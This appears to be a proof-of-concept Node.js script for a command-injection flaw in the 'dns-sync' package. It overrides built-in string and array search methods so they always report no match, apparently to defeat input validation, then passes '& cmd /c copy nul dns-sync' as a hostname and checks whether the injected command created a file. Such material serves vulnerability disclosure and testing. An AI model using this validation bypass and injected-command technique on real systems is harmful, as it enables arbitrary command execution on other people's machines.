String.prototype.includes = () => false;
String.prototype.startsWith = () => false;
String.prototype.endsWith = () => false;
String.prototype.indexOf = () => -1;
String.prototype.lastIndexOf = () => false;
String.prototype.match = () => false;
String.prototype.search = () => false;
String.prototype.matchAll = () => false;
Array.prototype.includes = () => false;
Array.prototype.indexOf = () => -1;
const dnsSync = require('dns-sync');
const fs = require('fs');
const path = './dns-sync';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
dnsSync.resolve('& cmd /c copy nul dns-sync');
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + true + ' }');
fs.unlink(path, function (err) {
});